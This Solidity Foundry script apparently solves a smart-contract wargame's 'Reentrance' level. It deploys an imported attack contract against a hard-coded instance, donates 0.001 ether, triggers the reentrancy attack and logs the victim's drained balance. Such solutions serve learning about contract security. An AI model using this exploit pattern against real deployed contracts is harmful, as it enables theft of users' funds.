// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {ReentranceAttack} from "../src/attacks/ReentranceAttack.sol";
import {Reentrance} from "../src/levels/Reentrance.sol";

contract ReentranceScript is Script {
    Reentrance public instance = Reentrance(payable(0x640Effe03c190ad5A66D3877d113FD578F1c100c));
    ReentranceAttack public attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new ReentranceAttack(address(instance));
	console.log("ReentranceAttack Contract deployed to:", address(attacker));
	console.log("ReentranceAttack Contract initial balance:", address(attacker).balance);
	console.log("Reentrance Contract initial balance:", address(instance).balance);
	console.log("Donating 0.001 ether...");
	instance.donate{value: 0.001 ether}(address(attacker));
	console.log("Attacking...");
	attacker.attack(0.001 ether);
	console.log("ReentranceAttack Contract new balance:", address(attacker).balance);
	console.log("Reentrance Contract new balance:", address(instance).balance);
	vm.stopBroadcast();
    }
}
